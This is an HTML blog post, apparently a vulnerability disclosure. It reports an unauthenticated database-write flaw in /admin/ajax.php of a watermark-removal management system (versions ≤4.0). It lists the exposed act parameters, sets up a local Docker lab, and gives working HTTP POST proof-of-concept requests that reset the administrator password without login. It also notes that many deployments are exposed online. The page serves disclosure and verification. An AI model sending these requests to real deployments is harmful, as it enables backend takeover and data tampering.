@@ -1,0 +1,485 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Watermark removal management system vul_1 | Lhz&#39;s blog</title>
+<meta name="keywords" content="CVE">
+<meta name="description" content="Title: Unauthorized Database Operation Vulnerability in Ludashi Watermark Removal Management System
+BUG_Author: liuhanzhi
+Affected Version: Watermark removal management system ≤ 4.0
+Vendor: Standalone Watermark Removal Mini Program
+Software: Ludashi Watermark Removal Management System Download Link
+Vulnerability Files:
+
+admin/ajax.php
+
+Description:
+
+
+Unauthorized database write operations:
+
+
+Deobfuscate the obfuscated code in /admin/ajax.php, click to download the anti-obfuscation code.
+
+
+In /admin/ajax.php, the interface dispatches a large amount of add/delete/update logic through the act parameter.
+
+
+No effective backend session authentication and authorization logic is found in the file, so attackers can directly invoke sensitive operations without logging in.">
+<meta name="author" content="">
+<link rel="canonical" href="https://lhzzz08.github.io/posts/cveapplication1/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.343cc480b9ffc8f04ccbe5e968ad674880cab773ec19905e93033065c1e7a804.css" integrity="sha256-NDzEgLn/yPBMy&#43;XpaK1nSIDKt3PsGZBekwMwZcHnqAQ=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://lhzzz08.github.io/favicon.svg">
+<link rel="icon" type="image/png" sizes="16x16" href="https://lhzzz08.github.io/favicon.svg">
+<link rel="icon" type="image/png" sizes="32x32" href="https://lhzzz08.github.io/favicon.svg">
+<link rel="apple-touch-icon" href="https://lhzzz08.github.io/apple-icon.png">
+<link rel="mask-icon" href="https://lhzzz08.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://lhzzz08.github.io/posts/cveapplication1/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><meta property="og:url" content="https://lhzzz08.github.io/posts/cveapplication1/">
+  <meta property="og:site_name" content="Lhz&#39;s blog">
+  <meta property="og:title" content="Watermark removal management system vul_1">
+  <meta property="og:description" content="Title: Unauthorized Database Operation Vulnerability in Ludashi Watermark Removal Management System BUG_Author: liuhanzhi
+Affected Version: Watermark removal management system ≤ 4.0
+Vendor: Standalone Watermark Removal Mini Program
+Software: Ludashi Watermark Removal Management System Download Link
+Vulnerability Files:
+admin/ajax.php Description: Unauthorized database write operations:
+Deobfuscate the obfuscated code in /admin/ajax.php, click to download the anti-obfuscation code.
+In /admin/ajax.php, the interface dispatches a large amount of add/delete/update logic through the act parameter.
+No effective backend session authentication and authorization logic is found in the file, so attackers can directly invoke sensitive operations without logging in.">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-04-23T22:41:23+08:00">
+    <meta property="article:modified_time" content="2026-04-23T22:41:23+08:00">
+    <meta property="article:tag" content="CVE">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Watermark removal management system vul_1">
+<meta name="twitter:description" content="Title: Unauthorized Database Operation Vulnerability in Ludashi Watermark Removal Management System
+BUG_Author: liuhanzhi
+Affected Version: Watermark removal management system ≤ 4.0
+Vendor: Standalone Watermark Removal Mini Program
+Software: Ludashi Watermark Removal Management System Download Link
+Vulnerability Files:
+
+admin/ajax.php
+
+Description:
+
+
+Unauthorized database write operations:
+
+
+Deobfuscate the obfuscated code in /admin/ajax.php, click to download the anti-obfuscation code.
+
+
+In /admin/ajax.php, the interface dispatches a large amount of add/delete/update logic through the act parameter.
+
+
+No effective backend session authentication and authorization logic is found in the file, so attackers can directly invoke sensitive operations without logging in.">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://lhzzz08.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Watermark removal management system vul_1",
+      "item": "https://lhzzz08.github.io/posts/cveapplication1/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Watermark removal management system vul_1",
+  "name": "Watermark removal management system vul_1",
+  "description": "Title: Unauthorized Database Operation Vulnerability in Ludashi Watermark Removal Management System BUG_Author: liuhanzhi\nAffected Version: Watermark removal management system ≤ 4.0\nVendor: Standalone Watermark Removal Mini Program\nSoftware: Ludashi Watermark Removal Management System Download Link\nVulnerability Files:\nadmin/ajax.php Description: Unauthorized database write operations:\nDeobfuscate the obfuscated code in /admin/ajax.php, click to download the anti-obfuscation code.\nIn /admin/ajax.php, the interface dispatches a large amount of add/delete/update logic through the act parameter.\nNo effective backend session authentication and authorization logic is found in the file, so attackers can directly invoke sensitive operations without logging in.\n",
+  "keywords": [
+    "CVE"
+  ],
+  "articleBody": "Title: Unauthorized Database Operation Vulnerability in Ludashi Watermark Removal Management System BUG_Author: liuhanzhi\nAffected Version: Watermark removal management system ≤ 4.0\nVendor: Standalone Watermark Removal Mini Program\nSoftware: Ludashi Watermark Removal Management System Download Link\nVulnerability Files:\nadmin/ajax.php Description: Unauthorized database write operations:\nDeobfuscate the obfuscated code in /admin/ajax.php, click to download the anti-obfuscation code.\nIn /admin/ajax.php, the interface dispatches a large amount of add/delete/update logic through the act parameter.\nNo effective backend session authentication and authorization logic is found in the file, so attackers can directly invoke sensitive operations without logging in.\nCause of the vulnerability:\nThe interface directly trusts the request source and does not verify administrator login status before each write-operation branch. The interface exposes add/delete/update capabilities (INSERT/UPDATE/DELETE) for multiple business tables. act parameters that can be called without authorization:\nAdd: edit_faqtj, edit_bantj, edit_tooltj, edit_dytj, edit_Xcxtj Modify: edit_Wzxx, edit_lds, edit_Adpass, edit_Xcxxg, edit_faqxg, edit_banxg, edit_toolxg, edit_dyxg, edit_adxg Delete: edit_XcxShanchu, edit_faqShanchu, edit_toolShanchu, edit_banShanchu, edit_dyShanchu Impact:\nUnauthorized addition/tampering/deletion of backend data such as tutorials, FAQ, carousels, and tools. Site configuration and ad configuration can be modified, and administrator passwords can be changed. Causes business data damage, backend takeover, and persistent operational risk. There are many public Internet deployment cases.\nShodan platform\nFOFA platform\nLocal Verification Download the official source code.\nGo to /去水印小程序/去水印4.0新版本/, extract 最新版去水印4.0版本后端安装源码.zip, and copy all extracted backend code to a test directory.\nAdd a docker-compose.yml file in the test directory.\nservices: web: image: php:7.2-apache container_name: test-vul-web platform: linux/amd64 ports: - \"8889:80\" volumes: - ./:/var/www/html depends_on: - db command: \u003e bash -lc \" docker-php-ext-install pdo pdo_mysql mysqli \u0026\u0026 a2enmod rewrite \u0026\u0026 apache2-foreground \" db: image: mysql:5.6 container_name: test-vul-mysql platform: linux/amd64 ports: - \"3308:3306\" environment: MYSQL_ROOT_PASSWORD: root123 MYSQL_DATABASE: ludeqi TZ: Asia/Shanghai command: [\"mysqld\", \"--character-set-server=utf8\", \"--collation-server=utf8_general_ci\"] volumes: - db_data:/var/lib/mysql volumes: db_data: Start the Docker containers. docker compose -p test-vul up -d After successful startup, visit http://127.0.0.1:8889/install for initialization (wait a while and refresh to see the initialization page). Visit http://127.0.0.1:8889/admin/login.php and log in with admin:123456:111111 to access the backend. Proof of Concept: In an unauthenticated state, send the following request to the target: Successful modification verification PoC\nPOST /admin/ajax.php?act=edit_Adpass HTTP/1.1 Host: Content-Length: 50 User-Agent: Mozilla/5.0 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Connection: close admin_user=admin\u0026admin_pwd=654321\u0026rpassword=654321 Failed verification PoC\nPOST /admin/ajax.php?act=edit_Adpass HTTP/1.1 Host: Content-Length: 50 User-Agent: Mozilla/5.0 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Connection: close admin_user=admin\u0026admin_pwd=654321\u0026rpassword=123456 Observe the response content:\nSuccessful modification verification PoC success response: {\"code\":1,\"msg\":\"succ\"} Failed verification PoC success response: {\"code\":-1,\"msg\":\"The two passwords are inconsistent!\"} Perform strong verification for the successful modification verification PoC: log out of the current system and log in again to check whether the password is 654321.\n",
+  "wordCount" : "427",
+  "inLanguage": "en",
+  "datePublished": "2026-04-23T22:41:23+08:00",
+  "dateModified": "2026-04-23T22:41:23+08:00",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://lhzzz08.github.io/posts/cveapplication1/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Lhz's blog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://lhzzz08.github.io/favicon.svg"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://lhzzz08.github.io/" accesskey="h" title="Lhz&#39;s blog (Alt + H)">Lhz&#39;s blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://lhzzz08.github.io/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://lhzzz08.github.io/categories/" title="Categories">
+                    <span>Categories</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://lhzzz08.github.io/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      Watermark removal management system vul_1
+    </h1>
+    <div class="post-meta"><span title='2026-04-23 22:41:23 +0800 CST'>April 23, 2026</span>
+
+</div>
+  </header> 
+  <div class="post-content"><h2 id="title-unauthorized-database-operation-vulnerability-in-ludashi-watermark-removal-management-system">Title: Unauthorized Database Operation Vulnerability in Ludashi Watermark Removal Management System<a hidden class="anchor" aria-hidden="true" href="#title-unauthorized-database-operation-vulnerability-in-ludashi-watermark-removal-management-system">#</a></h2>
+<p><strong>BUG_Author:</strong> liuhanzhi</p>
+<p><strong>Affected Version:</strong> Watermark removal management system ≤ 4.0</p>
+<p><strong>Vendor:</strong> <a href="https://3ep447gp4d.k.topthink.com/@9421839zpg/chengxujieshao.html">Standalone Watermark Removal Mini Program</a></p>
+<p><strong>Software:</strong> <a href="https://3ep447gp4d.k.topthink.com/@9421839zpg/chengxuxiazai.html">Ludashi Watermark Removal Management System</a> <a href="https://pan.quark.cn/s/f6727f5273a4#/list/share">Download Link</a></p>
+<p><strong>Vulnerability Files:</strong></p>
+<ul>
+<li><code>admin/ajax.php</code></li>
+</ul>
+<h2 id="description">Description:<a hidden class="anchor" aria-hidden="true" href="#description">#</a></h2>
+<ol>
+<li>
+<p><strong>Unauthorized database write operations:</strong></p>
+<ul>
+<li>
+<p>Deobfuscate the obfuscated code in <code>/admin/ajax.php</code>, click to download the <a href="/files/ajax.php">anti-obfuscation code</a>.</p>
+</li>
+<li>
+<p>In <code>/admin/ajax.php</code>, the interface dispatches a large amount of add/delete/update logic through the <code>act</code> parameter.</p>
+</li>
+<li>
+<p>No effective backend session authentication and authorization logic is found in the file, so attackers can directly invoke sensitive operations without logging in.</p>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Cause of the vulnerability:</strong></p>
+<ul>
+<li>The interface directly trusts the request source and does not verify administrator login status before each write-operation branch.</li>
+<li>The interface exposes add/delete/update capabilities (<code>INSERT/UPDATE/DELETE</code>) for multiple business tables.</li>
+</ul>
+</li>
+<li>
+<p><strong><code>act</code> parameters that can be called without authorization:</strong></p>
+<ul>
+<li>Add: <code>edit_faqtj</code>, <code>edit_bantj</code>, <code>edit_tooltj</code>, <code>edit_dytj</code>, <code>edit_Xcxtj</code></li>
+<li>Modify: <code>edit_Wzxx</code>, <code>edit_lds</code>, <code>edit_Adpass</code>, <code>edit_Xcxxg</code>, <code>edit_faqxg</code>, <code>edit_banxg</code>, <code>edit_toolxg</code>, <code>edit_dyxg</code>, <code>edit_adxg</code></li>
+<li>Delete: <code>edit_XcxShanchu</code>, <code>edit_faqShanchu</code>, <code>edit_toolShanchu</code>, <code>edit_banShanchu</code>, <code>edit_dyShanchu</code></li>
+</ul>
+</li>
+<li>
+<p><strong>Impact:</strong></p>
+<ul>
+<li>Unauthorized addition/tampering/deletion of backend data such as tutorials, FAQ, carousels, and tools.</li>
+<li>Site configuration and ad configuration can be modified, and administrator passwords can be changed.</li>
+<li>Causes business data damage, backend takeover, and persistent operational risk.</li>
+</ul>
+</li>
+<li>
+<p>There are many public Internet deployment cases.</p>
+</li>
+</ol>
+<p>Shodan platform</p>
+<p><img loading="lazy" src="/images/2026-2/202604232135.png"></p>
+<p>FOFA platform</p>
+<p><img loading="lazy" src="/images/2026-2/202604232128.png"></p>
+<h1 id="local-verification">Local Verification<a hidden class="anchor" aria-hidden="true" href="#local-verification">#</a></h1>
+<ol>
+<li>
+<p>Download the official <a href="https://pan.quark.cn/s/f6727f5273a4#/list/share">source code</a>.</p>
+</li>
+<li>
+<p>Go to <code>/去水印小程序/去水印4.0新版本/</code>, extract <code>最新版去水印4.0版本后端安装源码.zip</code>, and copy all extracted backend code to a test directory.</p>
+</li>
+<li>
+<p>Add a <code>docker-compose.yml</code> file in the test directory.</p>
+</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yml" data-lang="yml"><span style="display:flex;"><span><span style="color:#f92672">services</span>:
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">web</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">image</span>: <span style="color:#ae81ff">php:7.2-apache</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">container_name</span>: <span style="color:#ae81ff">test-vul-web</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">platform</span>: <span style="color:#ae81ff">linux/amd64</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">ports</span>:
+</span></span><span style="display:flex;"><span>      - <span style="color:#e6db74">&#34;8889:80&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">volumes</span>:
+</span></span><span style="display:flex;"><span>      - <span style="color:#ae81ff">./:/var/www/html</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">depends_on</span>:
+</span></span><span style="display:flex;"><span>      - <span style="color:#ae81ff">db</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">command</span>: &gt;<span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      bash -lc &#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      docker-php-ext-install pdo pdo_mysql mysqli &amp;&amp;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      a2enmod rewrite &amp;&amp;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      apache2-foreground
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      &#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">db</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">image</span>: <span style="color:#ae81ff">mysql:5.6</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">container_name</span>: <span style="color:#ae81ff">test-vul-mysql</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">platform</span>: <span style="color:#ae81ff">linux/amd64</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">ports</span>:
+</span></span><span style="display:flex;"><span>      - <span style="color:#e6db74">&#34;3308:3306&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">environment</span>:
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">MYSQL_ROOT_PASSWORD</span>: <span style="color:#ae81ff">root123</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">MYSQL_DATABASE</span>: <span style="color:#ae81ff">ludeqi</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">TZ</span>: <span style="color:#ae81ff">Asia/Shanghai</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">command</span>: [<span style="color:#e6db74">&#34;mysqld&#34;</span>, <span style="color:#e6db74">&#34;--character-set-server=utf8&#34;</span>, <span style="color:#e6db74">&#34;--collation-server=utf8_general_ci&#34;</span>]
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">volumes</span>:
+</span></span><span style="display:flex;"><span>      - <span style="color:#ae81ff">db_data:/var/lib/mysql</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">volumes</span>:
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">db_data</span>:
+</span></span></code></pre></div><ol start="4">
+<li>Start the Docker containers.</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>docker compose -p test-vul up -d
+</span></span></code></pre></div><ol start="5">
+<li>After successful startup, visit <code>http://127.0.0.1:8889/install</code> for initialization (wait a while and refresh to see the initialization page).</li>
+</ol>
+<p><img loading="lazy" src="/images/2026-2/202604232206.png"></p>
+<p><img loading="lazy" src="/images/2026-2/202604232204.png"></p>
+<ol start="6">
+<li>Visit <code>http://127.0.0.1:8889/admin/login.php</code> and log in with admin:123456:111111 to access the backend.</li>
+</ol>
+<p><img loading="lazy" src="/images/2026-2/202604232213.png"></p>
+<h2 id="proof-of-concept">Proof of Concept:<a hidden class="anchor" aria-hidden="true" href="#proof-of-concept">#</a></h2>
+<ol>
+<li>In an unauthenticated state, send the following request to the target:</li>
+</ol>
+<p>Successful modification verification PoC</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> /admin/ajax.php?act=edit_Adpass <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">&lt;target-host&gt;</span>
+</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">50</span>
+</span></span><span style="display:flex;"><span>User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0</span>
+</span></span><span style="display:flex;"><span>Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">application/x-www-form-urlencoded; charset=UTF-8</span>
+</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>admin_user=admin&amp;admin_pwd=654321&amp;rpassword=654321
+</span></span></code></pre></div><p>Failed verification PoC</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> /admin/ajax.php?act=edit_Adpass <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">&lt;target-host&gt;</span>
+</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">50</span>
+</span></span><span style="display:flex;"><span>User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0</span>
+</span></span><span style="display:flex;"><span>Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">application/x-www-form-urlencoded; charset=UTF-8</span>
+</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>admin_user=admin&amp;admin_pwd=654321&amp;rpassword=123456
+</span></span></code></pre></div><ol start="2">
+<li>
+<p>Observe the response content:</p>
+<ul>
+<li>Successful modification verification PoC success response: <code>{&quot;code&quot;:1,&quot;msg&quot;:&quot;succ&quot;}</code></li>
+<li>Failed verification PoC success response: <code>{&quot;code&quot;:-1,&quot;msg&quot;:&quot;The two passwords are inconsistent!&quot;}</code></li>
+</ul>
+</li>
+<li>
+<p>Perform strong verification for the successful modification verification PoC: log out of the current system and log in again to check whether the password is <code>654321</code>.</p>
+</li>
+</ol>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://lhzzz08.github.io/tags/cve/">CVE</a></li>
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="https://lhzzz08.github.io/">Lhz&#39;s blog</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
